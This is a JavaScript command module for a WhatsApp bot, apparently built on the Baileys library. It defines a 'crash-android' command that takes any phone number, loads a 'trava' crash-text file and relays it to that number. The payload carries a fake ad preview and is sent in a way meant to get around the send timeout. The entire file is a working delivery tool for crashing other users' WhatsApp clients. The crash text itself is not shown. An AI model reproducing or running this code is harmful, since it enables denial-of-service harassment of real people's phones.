import fs from 'fs';
import path from 'path';
import pkg from '@whiskeysockets/baileys';
const { generateWAMessageFromContent, proto } = pkg;

const crashAndroidMisa = {
    name: 'crash-android',
    alias: ['ca', 'crash', 'ola', 'multi-crash'],
    category: 'tools',
    noPrefix: true,
    isOwner: false,

    run: async (conn, m, { args, command }) => {
        const chat = m.key.remoteJid;

        try {
            if (!args[0]) return await conn.sendMessage(chat, { text: `⚠️ Uso: ${command} [número]` }, { quoted: m });

            const num = args[0].replace(/[^0-9]/g, '');
            const targetJid = `${num}@s.whatsapp.net`;

            const pathTrava = path.join(process.cwd(), 'travas', 'ola.js');
            if (!fs.existsSync(pathTrava)) return await conn.sendMessage(chat, { text: '❌ Archivo no encontrado.' }, { quoted: m });

            const contenidoTrava = fs.readFileSync(pathTrava, 'utf8');

            await conn.sendMessage(chat, { react: { text: '⏳', key: m.key } });

            // Generamos el mensaje manualmente para saltar el Timeout
            const msjCargado = await generateWAMessageFromContent(targetJid, {
                extendedTextMessage: {
                    text: contenidoTrava,
                    contextInfo: {
                        externalAdReply: {
                            title: 'MISA BOT SYSTEM',
                            body: 'Sending payload...',
                            mediaType: 1,
                            sourceUrl: 'https://github.com',
                            thumbnailUrl: 'https://qu.ax/ZpYy.jpg'
                        }
                    }
                }
            }, { userJid: conn.user.id });

            // Enviamos el mensaje mediante relayMessage
            await conn.relayMessage(targetJid, msjCargado.message, { 
                messageId: msjCargado.key.id 
            });

            await conn.sendMessage(chat, { react: { text: '✅', key: m.key } });
            console.log(`[OK] Crash enviado a ${num}`);

        } catch (err) {
            console.error('Error en el comando:', err);
            await conn.sendMessage(chat, { text: '❌ Error al procesar el envío.' }, { quoted: m });
        }
    }
};

export default crashAndroidMisa;
